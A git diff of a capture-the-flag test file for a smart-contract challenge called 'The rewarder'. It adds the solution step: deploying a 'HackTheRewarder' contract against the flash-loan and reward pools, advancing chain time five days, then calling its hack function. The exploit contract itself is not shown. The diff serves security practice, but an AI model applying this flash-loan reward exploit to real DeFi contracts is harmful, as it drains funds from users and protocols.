@@ -70,11 +70,22 @@ describe('[Challenge] The rewarder', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
-        hackContract = await (await ethers.getContractFactory('HackTheRewarder', deployer)).deploy(flashLoanPool.address, rewarderPool.address);
+
+        // Deploy our smart contract
+        hackContract = await (await ethers.getContractFactory('HackTheRewarder', deployer)).deploy(
+            flashLoanPool.address,
+            rewarderPool.address,
+            liquidityToken.address,
+            rewardToken.address
+        );
+        // Wait until the 5 day period expires
+        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
+
+        // Call the function hack inside our smart contract
+        // Pass the tokens in lender pool amount as argument
         await expect(
             hackContract.connect(player).hack(TOKENS_IN_LENDER_POOL)
         ).not.to.be.reverted;
-        
     });
 
     after(async function () {
